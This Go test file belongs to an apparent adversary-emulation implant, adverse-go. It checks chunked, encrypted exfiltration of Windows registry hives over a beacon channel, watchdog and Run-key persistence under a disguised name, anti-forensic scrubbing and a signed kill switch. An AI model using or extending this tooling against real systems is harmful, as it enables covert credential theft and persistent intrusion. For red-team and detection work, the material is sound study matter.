package agent

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/message"
	"github.com/ashwnn/adverse-go/internal/persist"
	"github.com/ashwnn/adverse-go/internal/registrywin"
	"github.com/ashwnn/adverse-go/internal/spool"
	"github.com/ashwnn/adverse-go/internal/wire"
)

// TestConfigValidateNewFields pins the fail-closed validation of the
// persistence/spool/shaping/antiforensic/exit fields.
func TestConfigValidateNewFields(t *testing.T) {
	tests := []struct {
		name    string
		mutate  func(*Config)
		wantErr bool
	}{
		{"defaults_ok", func(*Config) {}, false},
		{"persistence_none_ok", func(c *Config) { c.Persistence.Mode = "none" }, false},
		{"persistence_bad_mode", func(c *Config) { c.Persistence.Mode = "bogus" }, true},
		{"persistence_watchdog_without_real_mode_allowed_inert", func(c *Config) { c.Persistence.Mode = "watchdog" }, false},
		{"persistence_runkey_without_real_mode_allowed_inert", func(c *Config) { c.Persistence.Mode = "runkey" }, false},
		{"persistence_both_without_real_mode_allowed_inert", func(c *Config) { c.Persistence.Mode = "both" }, false},
		{"persistence_watchdog_real_mode_ok", func(c *Config) {
			c.RealMode = true
			c.Persistence.Mode = "watchdog"
		}, false},
		{"scrub_without_real_mode_ok", func(c *Config) { c.AntiForensic.ScrubTraces = true }, false},
		{"scrub_real_mode_ok", func(c *Config) {
			c.RealMode = true
			c.AntiForensic.ScrubTraces = true
		}, false},
		{"real_mode_without_lab_env_ok", func(c *Config) { c.RealMode = true }, false},
		{"spool_relative_dir", func(c *Config) { c.Spool.Dir = "relative/spool" }, true},
		{"spool_posix_abs_ok", func(c *Config) { c.Spool.Dir = "/var/tmp/adverse-spool" }, false},
		{"spool_windows_abs_ok", func(c *Config) { c.Spool.Dir = `C:\ProgramData\adverse\spool` }, false},
		{"spool_unc_ok", func(c *Config) { c.Spool.Dir = `\\server\share\spool` }, false},
		{"jitter_negative", func(c *Config) { c.Shaping.UploadJitterMs = -1 }, true},
		{"jitter_too_large", func(c *Config) { c.Shaping.UploadJitterMs = 60001 }, true},
		{"jitter_max_ok", func(c *Config) { c.Shaping.UploadJitterMs = 60000 }, false},
		{"exit_after_delivery_ok", func(c *Config) { c.ExitAfterDelivery = true }, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := validTestConfig()
			tt.mutate(&cfg)
			err := cfg.Validate()
			if (err != nil) != tt.wantErr {
				t.Fatalf("Validate() error=%v wantErr=%v", err, tt.wantErr)
			}
		})
	}
}

// TestSpoolOpenFailClosedInRealMode pins the documented choice: a spool open
// failure in real_mode is fatal instead of silently degrading to memory.
func TestSpoolOpenFailClosedInRealMode(t *testing.T) {
	t.Setenv("ADVERSE_BEHAVIOURAL", "0")

	blocker := filepath.Join(t.TempDir(), "blocker")
	if err := os.WriteFile(blocker, []byte("x"), 0600); err != nil {
		t.Fatalf("write blocker: %v", err)
	}

	cfg := validTestConfig()
	cfg.RealMode = true
	cfg.Spool = SpoolConfig{Enabled: true, Dir: filepath.Join(blocker, "spool")}
	a := newTestAgent(t, cfg)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if rc := a.Run(ctx); rc != 1 {
		t.Fatalf("spool open failure in real_mode: Run() = %d, want 1", rc)
	}
}

// TestRunContextCancellationReturnsZero pins exit-code normalization: a
// network failure caused by kill-switch context cancellation is an intentional
// stop (0), not fatal (1), so the watchdog does not relaunch.
func TestRunContextCancellationReturnsZero(t *testing.T) {
	t.Setenv("ADVERSE_BEHAVIOURAL", "0")

	cfg := validTestConfig()
	a := newTestAgent(t, cfg)

	helloDone := false
	a.postFrameHook = func(ctx context.Context, _ []byte, seq uint32) ([]byte, error) {
		if !helloDone {
			helloDone = true
			hsKey, err := cryptokeys.HandshakeKey(a.ephPriv, a.serverPub, a.salt, a.cfg.AgentID)
			if err != nil {
				return nil, err
			}
			hsPrefix, err := cryptokeys.FramePrefix(hsKey, "v2")
			if err != nil {
				return nil, err
			}
			_, dummyPub, err := cryptokeys.GenEphemeral()
			if err != nil {
				return nil, err
			}
			payload := fmt.Sprintf(`{"interval":1,"jitter":0,"server_eph_pub":%q}`, hex.EncodeToString(dummyPub[:]))
			raw, err := json.Marshal(message.Make("beacon", cfg.AgentID, "hello-ack", payload, float64(time.Now().UnixNano())/1e9))
			if err != nil {
				return nil, err
			}
			return wire.Build(raw, hsKey[:], hsPrefix[:], []byte(cfg.AgentID+":in"), 0, wire.DirectionServerToClient)
		}
		<-ctx.Done()
		return nil, ctx.Err()
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() {
		time.Sleep(50 * time.Millisecond)
		cancel()
	}()

	if rc := a.Run(ctx); rc != 0 {
		t.Fatalf("ctx cancellation must normalize to 0, got %d", rc)
	}
}

// openTestSpool opens a real spool store for the config's secret/agent ID.
func openTestSpool(t *testing.T, cfg Config, dir string) *spool.Store {
	t.Helper()
	secret32, err := cryptokeys.Secret32(cfg.Secret)
	if err != nil {
		t.Fatalf("secret32: %v", err)
	}
	st, err := spool.Open(dir, secret32[:], cfg.AgentID)
	if err != nil {
		t.Fatalf("spool.Open: %v", err)
	}
	return st
}

// resultHook captures result seqs (and optionally data) and acks each frame.
// It is safe for the single-threaded agent flows used in these tests.
func resultHook(a *Agent, cfg Config, seen *[]int, data *[]string, failFirst bool) func(context.Context, []byte, uint32) ([]byte, error) {
	failed := false
	return func(_ context.Context, frame []byte, seq uint32) ([]byte, error) {
		plain, _, _, err := wire.Parse(frame, a.sessionKey[:], a.prefix[:], []byte(cfg.AgentID+":out"), wire.DirectionClientToServer)
		if err != nil {
			return nil, err
		}
		var msg struct {
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(plain, &msg); err != nil {
			return nil, err
		}
		var rp struct {
			Seq     int    `json:"seq"`
			DataB64 string `json:"data_b64"`
		}
		if err := json.Unmarshal([]byte(msg.Payload), &rp); err != nil {
			return nil, err
		}
		if failFirst && !failed {
			failed = true
			return nil, fmt.Errorf("injected send failure")
		}
		if seen != nil {
			*seen = append(*seen, rp.Seq)
		}
		if data != nil {
			*data = append(*data, rp.DataB64)
		}
		ackJSON, _ := json.Marshal(message.Make("beacon", cfg.AgentID, "beacon-0", "", float64(time.Now().UnixNano())/1e9))
		return wire.Build(ackJSON, a.sessionKey[:], a.prefix[:], []byte(cfg.AgentID+":in"), seq+1, wire.DirectionServerToClient)
	}
}

// TestJobsStatusResendsMissingAndPrunes pins jobs-status handling: missing
// seqs are resent from the spool and every spooled seq not reported missing
// (with an untruncated list) is deleted.
func TestJobsStatusResendsMissingAndPrunes(t *testing.T) {
	cfg := validTestConfig()
	a := newTestAgent(t, cfg)
	st := openTestSpool(t, cfg, t.TempDir())
	a.spool = st

	const jobID = "job-status"
	const total = 5
	for i := 0; i < total; i++ {
		if err := st.Put(jobID, "SYSTEM", i, total, []byte{byte(i), 0xAA}); err != nil {
			t.Fatalf("spool put %d: %v", i, err)
		}
	}

	var seen []int
	a.postFrameHook = resultHook(a, cfg, &seen, nil, false)

	payload := `{"interval":1,"jitter":0,"jobs":[{"job_id":"job-status","hive":"SYSTEM","total":5,"received":3,"missing":[1,3],"complete":false}]}`
	if exited := a.updateBeaconInterval(context.Background(), map[string]any{"payload": payload}); exited {
		t.Fatal("incomplete job must not trigger exit_after_delivery")
	}
	if fmt.Sprint(seen) != "[1 3]" {
		t.Fatalf("resent seqs = %v, want [1 3]", seen)
	}
	prog, err := st.Progress(jobID)
	if err != nil {
		t.Fatalf("Progress: %v", err)
	}
	if prog.Chunks != 2 {
		t.Fatalf("spooled chunks after prune = %d, want 2 (missing seqs kept)", prog.Chunks)
	}
	for _, seq := range []int{0, 2, 4} {
		if _, err := st.Get(jobID, seq); !errors.Is(err, fs.ErrNotExist) {
			t.Errorf("seq %d should have been acked (Get err=%v)", seq, err)
		}
	}
}

// TestJobsStatusTruncatedMissingDoesNotPrune pins the conservative rule: a
// missing list truncated at 128 means the tail is unknown, so nothing is
// deleted.
func TestJobsStatusTruncatedMissingDoesNotPrune(t *testing.T) {
	cfg := validTestConfig()
	a := newTestAgent(t, cfg)
	st := openTestSpool(t, cfg, t.TempDir())
	a.spool = st

	const jobID = "job-trunc"
	const total = 200
	if err := st.Put(jobID, "SYSTEM", 0, total, []byte{0x01}); err != nil {
		t.Fatalf("spool put: %v", err)
	}

	var seen []int
	a.postFrameHook = resultHook(a, cfg, &seen, nil, false)

	missing := make([]int, maxServerMissing)
	for i := range missing {
		missing[i] = i
	}
	payloadBytes, _ := json.Marshal(map[string]any{
		"interval": 1,
		"jitter":   0,
		"jobs": []map[string]any{{
			"job_id": jobID, "hive": "SYSTEM", "total": total,
			"received": 72, "missing": missing, "complete": false,
		}},
	})
	if exited := a.updateBeaconInterval(context.Background(), map[string]any{"payload": string(payloadBytes)}); exited {
		t.Fatal("incomplete job must not trigger exit")
	}
	prog, err := st.Progress(jobID)
	if err != nil {
		t.Fatalf("Progress: %v", err)
	}
	if prog.Chunks != 1 {
		t.Fatalf("truncated missing list must not prune: chunks = %d, want 1", prog.Chunks)
	}
	if len(prog.Acked) != 0 {
		t.Fatalf("truncated missing list must not ack: acked = %v", prog.Acked)
	}
}

// TestSpoolResumeUsesSpooledBytes pins that a resumed job sends the durable
// spooled bytes for already-spooled seqs instead of a fresh extraction.
func TestSpoolResumeUsesSpooledBytes(t *testing.T) {
	t.Setenv("ADVERSE_BEHAVIOURAL", "0")

	cfg := validTestConfig()
	a := newTestAgent(t, cfg)
	st := openTestSpool(t, cfg, t.TempDir())
	a.spool = st

	jobID := "job-resume-spool"
	payload := map[string]any{
		"action":     "extract",
		"hives":      []any{"SYSTEM"},
		"chunk_size": float64(256), // 1024-byte synthetic hive => 4 chunks
	}

	// First dispatch: fail the first send after everything is spooled.
	a.postFrameHook = resultHook(a, cfg, nil, nil, true)
	if rc := a.handleTask(context.Background(), taskMsg(t, jobID, payload)); rc != 0 {
		t.Fatalf("first dispatch rc=%d, want 0", rc)
	}
	prog, err := st.Progress(jobID)
	if err != nil {
		t.Fatalf("Progress: %v", err)
	}
	if prog.Total != 4 || prog.Chunks != 4 {
		t.Fatalf("spool after first dispatch = %+v, want total/chunks 4/4", prog)
	}

	// Replace seq 0 with sentinel bytes; the resume must send exactly these.
	sentinel := []byte("SENTINEL-SPOOLED-BYTES")
	if err := st.Put(jobID, "SYSTEM", 0, prog.Total, sentinel); err != nil {
		t.Fatalf("sentinel put: %v", err)
	}

	// A fully spooled job must not be re-extracted.
	extractCalls := 0
	a.extractChunksHook = func([]string, int) ([]*registrywin.Chunk, error) {
		extractCalls++
		return nil, fmt.Errorf("must not re-extract a fully spooled job")
	}

	var seen []int
	var data []string
	a.postFrameHook = resultHook(a, cfg, &seen, &data, false)
	if rc := a.handleTask(context.Background(), taskMsg(t, jobID, payload)); rc != 0 {
		t.Fatalf("re-dispatch rc=%d, want 0", rc)
	}
	if extractCalls != 0 {
		t.Fatalf("fully spooled job was re-extracted %d times", extractCalls)
	}
	if len(data) == 0 || data[0] != base64.StdEncoding.EncodeToString(sentinel) {
		t.Fatalf("first resumed payload = %q, want sentinel %q", data[0], base64.StdEncoding.EncodeToString(sentinel))
	}
	if !a.processedJobs.has(jobID) {
		t.Fatal("job must be terminal after resume completes")
	}
}

// fakePersistence records arm/disarm ordering for tests.
type fakePersistence struct {
	mu     sync.Mutex
	events *[]string
	armed  bool
}

func (f *fakePersistence) record(ev string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.events != nil {
		*f.events = append(*f.events, ev)
	}
}

func (f *fakePersistence) Arm() error {
	f.mu.Lock()
	f.armed = true
	f.mu.Unlock()
	f.record("arm")
	return nil
}

func (f *fakePersistence) Disarm() error {
	f.mu.Lock()
	f.armed = false
	f.mu.Unlock()
	f.record("disarm")
	return nil
}

func (f *fakePersistence) Armed() bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.armed
}

// TestPersistenceArmDisarmOrdering pins that persistence arms after extraction
// and before any chunk is sent, and disarms at teardown — using a fake manager
// so no real watchdog is spawned.
func TestPersistenceArmDisarmOrdering(t *testing.T) {
	t.Setenv("ADVERSE_BEHAVIOURAL", "0")

	cfg := validTestConfig()
	cfg.RealMode = true
	cfg.Persistence = PersistenceConfig{Mode: "watchdog", RunKeyName: "CtxUpdate"}
	cfg.Spool = SpoolConfig{Enabled: true, Dir: t.TempDir()}

	a := newTestAgent(t, cfg)
	a.spool = openTestSpool(t, cfg, cfg.Spool.Dir)
	a.extractChunksHook = func(_ []string, chunkSize int) ([]*registrywin.Chunk, error) {
		const total = 4
		out := make([]*registrywin.Chunk, total)
		for i := range out {
			out[i] = &registrywin.Chunk{
				Seq:          uint32(i),
				HiveName:     "SYSTEM",
				RegistryPath: "SYSTEM",
				Data:         bytes.Repeat([]byte{byte(i)}, chunkSize),
			}
		}
		return out, nil
	}

	var mu sync.Mutex
	var events []string
	fake := &fakePersistence{events: &events}
	var gotCfg persist.Config
	a.persistFactory = func(c persist.Config) (persist.Manager, error) {
		gotCfg = c
		return fake, nil
	}
	a.postFrameHook = func(_ context.Context, _ []byte, seq uint32) ([]byte, error) {
		mu.Lock()
		events = append(events, fmt.Sprintf("send-%d", seq))
		mu.Unlock()
		ackJSON, _ := json.Marshal(message.Make("beacon", cfg.AgentID, "beacon-0", "", float64(time.Now().UnixNano())/1e9))
		return wire.Build(ackJSON, a.sessionKey[:], a.prefix[:], []byte(cfg.AgentID+":in"), seq+1, wire.DirectionServerToClient)
	}

	jobID := "job-persist"
	payload := map[string]any{"action": "extract", "hives": []any{"SYSTEM"}, "chunk_size": float64(1024)}
	if rc := a.handleTask(context.Background(), taskMsg(t, jobID, payload)); rc != 0 {
		t.Fatalf("handleTask rc=%d, want 0", rc)
	}

	mu.Lock()
	got := append([]string(nil), events...)
	mu.Unlock()
	if len(got) == 0 || got[0] != "arm" {
		t.Fatalf("event order = %v, want arm before sends", got)
	}
	if !fake.Armed() {
		t.Fatal("fake persistence must be armed after extract")
	}
	if gotCfg.Mode != persist.ModeWatchdog || gotCfg.RunKeyName != "CtxUpdate" {
		t.Fatalf("persist config = %+v", gotCfg)
	}
	if !filepath.IsAbs(gotCfg.ExePath) {
		t.Fatalf("ExePath %q must be absolute", gotCfg.ExePath)
	}
	if len(gotCfg.Args) != 1 || gotCfg.Args[0] != "--resume" {
		t.Fatalf("Args = %v, want [--resume]", gotCfg.Args)
	}
	if gotCfg.TTL != 0 {
		t.Fatalf("TTL = %v, want 0 (unbounded; self-removes on delivery/kill)", gotCfg.TTL)
	}

	a.finalCleanup(true)
	if fake.Armed() {
		t.Fatal("fake persistence must be disarmed after final cleanup")
	}
}

// TestExitAfterDeliveryReturnsZeroAndCleansUp pins the delivery-complete
// path: the loop returns 0 through the normal path and the final cleanup
// disarms persistence, wipes the spool, and removes the state file.
func TestExitAfterDeliveryReturnsZeroAndCleansUp(t *testing.T) {
	cfg := validTestConfig()
	cfg.ExitAfterDelivery = true
	cfg.RealMode = true
	cfg.Persistence = PersistenceConfig{Mode: "watchdog"}

	a := newTestAgent(t, cfg)
	fake := &fakePersistence{armed: true}
	a.persistence = fake

	spoolDir := t.TempDir()
	a.spool = openTestSpool(t, cfg, spoolDir)

	stateDir := t.TempDir()
	statePath := filepath.Join(stateDir, ".agent_state.json")
	if err := os.WriteFile(statePath, []byte(`{"last_accepted_epoch":3}`), 0600); err != nil {
		t.Fatalf("write state: %v", err)
	}
	a.state = &StateFile{path: statePath}

	a.postFrameHook = func(_ context.Context, _ []byte, seq uint32) ([]byte, error) {
		payload := `{"interval":1,"jitter":0,"jobs":[{"job_id":"job-done","hive":"SYSTEM","total":2,"received":2,"complete":true}]}`
		raw, _ := json.Marshal(message.Make("beacon", cfg.AgentID, "beacon-0", payload, float64(time.Now().UnixNano())/1e9))
		return wire.Build(raw, a.sessionKey[:], a.prefix[:], []byte(cfg.AgentID+":in"), seq+1, wire.DirectionServerToClient)
	}

	if rc := a.beaconLoop(context.Background()); rc != 0 {
		t.Fatalf("delivery-complete exit code = %d, want 0", rc)
	}
	if fake.Armed() {
		t.Fatal("persistence must be disarmed after delivery complete")
	}
	if _, err := os.Stat(spoolDir); !os.IsNotExist(err) {
		t.Fatalf("spool dir must be wiped (stat err=%v)", err)
	}
	if _, err := os.Stat(statePath); !os.IsNotExist(err) {
		t.Fatalf("state file must be removed after delivery complete (stat err=%v)", err)
	}
}

// TestAcceptedKillRunsCleanupAndRemovesState pins ordering: cleanup runs only
// after the signed kill verifies, and disarms/wipes/removes the replay floor.
func TestAcceptedKillRunsCleanupAndRemovesState(t *testing.T) {
	secret := "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
	secret32, _ := cryptokeys.Secret32(secret)
	signKey, _ := cryptokeys.DeriveSignKey(secret32)
	sig, _ := cryptokeys.KillSign(signKey, 7, "aabbccdd", "kill")

	cfg := validTestConfig()
	a := newTestAgent(t, cfg)
	fake := &fakePersistence{armed: true}
	a.persistence = fake
	a.spool = openTestSpool(t, cfg, t.TempDir())
	if err := a.spool.Put("job-keep", "SYSTEM", 0, 1, []byte{0xAB}); err != nil {
		t.Fatalf("spool put: %v", err)
	}

	stateDir := t.TempDir()
	statePath := filepath.Join(stateDir, ".agent_state.json")
	a.state = &StateFile{path: statePath}

	// A kill with a bad signature is rejected and must not wipe the spool.
	badKill := map[string]any{
		"agent_id": cfg.AgentID,
		"payload":  "kill",
		"epoch":    float64(7),
		"sig":      strings.Repeat("00", 64),
	}
	if rc := a.handleKill(badKill); rc != -1 {
		t.Fatalf("bad-signature kill rc=%d, want -1", rc)
	}
	if _, err := a.spool.Get("job-keep", 0); err != nil {
		t.Fatalf("rejected kill must not wipe the spool: %v", err)
	}
	if !fake.Armed() {
		t.Fatal("rejected kill must not disarm persistence")
	}

	killMsg := map[string]any{
		"agent_id": cfg.AgentID,
		"payload":  "kill",
		"epoch":    float64(7),
		"sig":      hex.EncodeToString(sig),
	}
	if rc := a.handleKill(killMsg); rc != 0 {
		t.Fatalf("accepted kill rc=%d, want 0", rc)
	}
	if fake.Armed() {
		t.Fatal("accepted kill must disarm persistence")
	}
	if _, err := os.Stat(statePath); !os.IsNotExist(err) {
		t.Fatalf("accepted kill must remove the replay floor (stat err=%v)", err)
	}
	if jobs, err := a.spool.Jobs(); err != nil || len(jobs) != 0 {
		t.Fatalf("accepted kill must wipe the spool (jobs=%v err=%v)", jobs, err)
	}

	// A replayed kill must never trigger cleanup.
	replayed := map[string]any{
		"agent_id": cfg.AgentID,
		"payload":  "kill",
		"epoch":    float64(7),
		"sig":      hex.EncodeToString(sig),
	}
	if rc := a.handleKill(replayed); rc != -1 {
		t.Fatalf("replayed kill rc=%d, want -1", rc)
	}
}

// TestUpdateBeaconIntervalToleratesAbsentJobs pins that payloads without a
// jobs array parse exactly as before.
func TestUpdateBeaconIntervalToleratesAbsentJobs(t *testing.T) {
	a := newTestAgent(t, validTestConfig())
	a.spool = openTestSpool(t, validTestConfig(), t.TempDir())
	if exited := a.updateBeaconInterval(context.Background(), map[string]any{"payload": `{"interval":9,"jitter":4}`}); exited {
		t.Fatal("payload without jobs must not trigger exit")
	}
	if a.beaconInterval != 9 || a.beaconJitter != 4 {
		t.Fatalf("interval/jitter = %d/%d, want 9/4", a.beaconInterval, a.beaconJitter)
	}
}
